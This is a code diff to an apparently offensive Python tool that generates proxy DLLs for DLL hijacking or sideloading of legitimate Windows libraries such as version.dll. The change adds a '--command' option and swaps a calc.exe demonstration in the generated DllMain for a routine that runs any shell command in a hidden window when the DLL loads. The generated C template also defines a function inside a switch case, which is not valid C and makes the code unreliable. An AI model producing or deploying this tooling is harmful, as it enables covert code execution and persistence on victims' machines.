@@ -22,13 +22,15 @@ def main():
     # Parse arguments
     parser = argparse.ArgumentParser(description="Generate a proxy DLL")
     parser.add_argument("dll", help="Path to the DLL to generate a proxy for")
-    parser.add_argument("--orig-path", "-p", help="The path of the legit .dll file", required=True)
+    parser.add_argument("--orig-path", "-p", help="The path of the legit .dll file e.g. c:\\Windows\\System32\\version.dll", required=True)
+    parser.add_argument("--command", "-c", help="Shell command to execute when DLL is loaded.")
     parser.add_argument("--output", "-o", help="Generated C++ proxy file to write to")
     args = parser.parse_args()
     dll: str = args.dll
     output: str = args.output
     orig_path: str = args.orig_path
     basename = os.path.basename(dll)
+    command: str = args.command
     if output is None:
         file, _ = os.path.splitext(basename)
         output = f"proxy_{file}.c"
@@ -96,35 +98,32 @@ BOOL APIENTRY DllMain( HMODULE hModule,
             PROCESS_INFORMATION pi = {{ 0 }};
             si.cb = sizeof(si);
 
-            /*
-            BOOL CreateProcessA(
-                [in, optional]      LPCSTR                lpApplicationName,
-                [in, out, optional] LPSTR                 lpCommandLine,
-                [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
-                [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
-                [in]                BOOL                  bInheritHandles,
-                [in]                DWORD                 dwCreationFlags,
-                [in, optional]      LPVOID                lpEnvironment,
-                [in, optional]      LPCSTR                lpCurrentDirectory,
-                [in]                LPSTARTUPINFOA        lpStartupInfo,
-                [out]               LPPROCESS_INFORMATION lpProcessInformation
-                );
-            */
-            // Use CreateProcessA to spawn calc.exe into its own primary thread. (not attached to OneDrive.exe)
-            // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+            DWORD RunHiddenCommand(const char* command) {{
+                STARTUPINFOA si;
+                PROCESS_INFORMATION pi;
+                DWORD exit_code = 0xFFFFFFFF;
 
-            CreateProcessA(
-                NULL,            
-                (LPSTR)"calc.exe",
-                NULL,         
-                NULL,           
-                FALSE,          
-                0,              
-                NULL,           
-                NULL,           
-                &si,            
-                &pi             
-            );
+                // Zero the structures
+                ZeroMemory(&si, sizeof(si));
+                si.cb = sizeof(si);
+                ZeroMemory(&pi, sizeof(pi));
+
+                // The CREATE_NO_WINDOW flag is what prevents the console window from appearing
+                if (CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
+                    ) {{
+                    // Wait until child process exits
+                    WaitForSingleObject(pi.hProcess, INFINITE);
+                    GetExitCodeProcess(pi.hProcess, &exit_code);
+
+                    // Always close handles to avoid leaks
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }}
+                return exit_code;
+            }}
+            // Insert command here.
+            RunHiddenCommand("{command}");
+
         }};
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
